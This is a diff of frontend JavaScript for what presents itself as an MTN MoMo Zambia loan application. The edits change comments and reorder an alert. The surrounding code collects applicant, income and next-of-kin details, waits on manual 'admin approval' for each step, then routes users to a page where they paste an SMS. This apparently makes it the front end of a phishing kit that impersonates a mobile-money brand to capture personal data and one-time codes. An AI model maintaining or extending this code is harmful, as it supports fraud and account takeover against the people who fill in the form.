@@ -1,5 +1,5 @@
 // ============================================================
-// MTN MoMo Zambia Loan Application – Frontend Logic (Corrected)
+// MTN MoMo Zambia Loan Application – Frontend Logic
 // ============================================================
 
 const S = {
@@ -166,8 +166,7 @@ function startApplication() {
     S.rejectedStep = null;
     clearRejectionInfo();
     if (!S.applicationId) {
-        // No need to create local ID – we'll get server ID after submission
-        // But we can keep a temporary value for UI
+        // Temporary ID until server assigns
         S.applicationId = 'TEMP-' + Date.now().toString().slice(-6);
     }
     document.getElementById('resendSmsBtn')?.classList.add('hidden');
@@ -408,16 +407,16 @@ function handleRejection(step) {
     }
 }
 
+// ─── Polling (with 404 handling) ───
 function startPoll(applicationId, step, onSuccess, onReject) {
     if (currentPollTimeout) { clearTimeout(currentPollTimeout); currentPollTimeout = null; }
     const check = async () => {
         try {
             const res = await fetch(`/api/status/${applicationId}/${step}`);
             if (res.status === 404) {
-                // Application not found – reset and alert
                 currentPollTimeout = null;
-                alert('Application not found. Please start again.');
                 clearAllStorage();
+                alert('Application not found. Please start again.');
                 goTo('page-landing');
                 return;
             }
@@ -497,6 +496,7 @@ function showApproval() {
     goTo('page-approval');
 }
 
+// ─── Submit Application (CRITICAL: capture server ID) ───
 async function submitApp() {
     const em = document.getElementById('s3em').value;
     const in_ = +document.getElementById('s3in').value;
@@ -505,7 +505,6 @@ async function submitApp() {
     if (!em || in_ <= 0) { showErr('s3Err', 'Please complete all fields.'); return; }
     S.employment = em; S.annualIncome = in_; S.kinName = kn; S.kinPhone = kp;
 
-    // We must send application and capture server's generated applicationId
     try {
         const response = await fetch('/api/send-application', {
             method: 'POST',
@@ -514,13 +513,12 @@ async function submitApp() {
         });
         const data = await response.json();
         if (data.ok) {
-            // CRITICAL: Save the server-generated applicationId
+            // ✅ USE SERVER-GENERATED ID
             S.applicationId = data.applicationId;
             saveApplicationId(S.applicationId);
             saveApplicationData();
             goTo('page-processing');
             document.getElementById('processingStatus').innerHTML = '⏳ Awaiting admin approval...';
-
             startPoll(S.applicationId, 'sms',
                 () => { showToast('✅ SMS Approved!', 'success'); goTo('page-sms-paste'); },
                 () => handleRejection('sms')
